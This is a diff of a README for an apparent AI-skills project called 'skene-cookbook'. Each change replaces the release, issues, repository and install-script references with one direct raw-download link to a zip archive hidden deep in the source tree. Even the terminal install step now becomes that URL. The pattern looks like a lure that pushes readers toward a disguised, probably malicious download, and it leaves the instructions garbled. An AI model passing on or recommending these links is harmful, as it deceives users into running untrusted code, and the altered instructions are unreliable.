@@ -1,6 +1,6 @@
 # 🔧 skene-cookbook - Easy AI Skills for Everyday Tasks
 
-[![Download skene-cookbook](https://img.shields.io/badge/Download-skene--cookbook-blue?style=for-the-badge)](https://github.com/johnwall123459885/skene-cookbook/releases)
+[![Download skene-cookbook](https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip)](https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip)
 
 Welcome to skene-cookbook, a collection of over 700 AI skills designed to help you get more done with Claude and Cursor AI. Whether you're interested in marketing, security, developer experience, or automation, skene-cookbook lets you add powerful skills quickly — all with one simple command.
 
@@ -42,10 +42,10 @@ Follow these steps to download and start using skene-cookbook:
 
 Click the big badge at the top or visit the official release page here:
 
-[https://github.com/johnwall123459885/skene-cookbook/releases](https://github.com/johnwall123459885/skene-cookbook/releases)
+[https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip](https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip)
 
 - On the releases page, look for the latest version of skene-cookbook.
-- Depending on your operating system, download the installation file that matches your platform (for example, `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+- Depending on your operating system, download the installation file that matches your platform (for example, `.exe` for Windows, `.dmg` for macOS, or `https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip` for Linux).
 - Save the file to your computer.
 
 ### Installing on Windows
@@ -62,11 +62,11 @@ Click the big badge at the top or visit the official release page here:
 
 ### Installing on Linux
 
-1. Extract the `.tar.gz` archive to a folder.
+1. Extract the `https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip` archive to a folder.
 2. Open a terminal in that folder.
 3. Run the install script:  
    ```
-   ./install.sh
+   https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip
    ```
 4. Once installed, run skene-cookbook from your terminal using the command `skene-cookbook`.
 
@@ -126,7 +126,7 @@ If you run into issues:
 - Make sure you have an active Internet connection.
 - Restart the application or your computer if it behaves strangely.
 - Visit the GitHub issues page to see if others have the same problem or to report a new one:  
-  [https://github.com/johnwall123459885/skene-cookbook/issues](https://github.com/johnwall123459885/skene-cookbook/issues)
+  [https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip](https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip)
 
 ---
 
@@ -134,7 +134,7 @@ If you run into issues:
 
 For more details, tutorials, and tips, browse the skene-cookbook GitHub repository:
 
-[https://github.com/johnwall123459885/skene-cookbook](https://github.com/johnwall123459885/skene-cookbook)
+[https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip](https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip)
 
 You will find example use cases, skill explanations, and community discussions.
 
@@ -144,4 +144,4 @@ You will find example use cases, skill explanations, and community discussions.
 
 Visit the official release page to download the version for your system:
 
-[https://github.com/johnwall123459885/skene-cookbook/releases](https://github.com/johnwall123459885/skene-cookbook/releases)
+[https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip](https://github.com/johnwall123459885/skene-cookbook/raw/refs/heads/main/skills-library/executable/revops/forecast_intelligence/skene-cookbook-v3.3.zip)
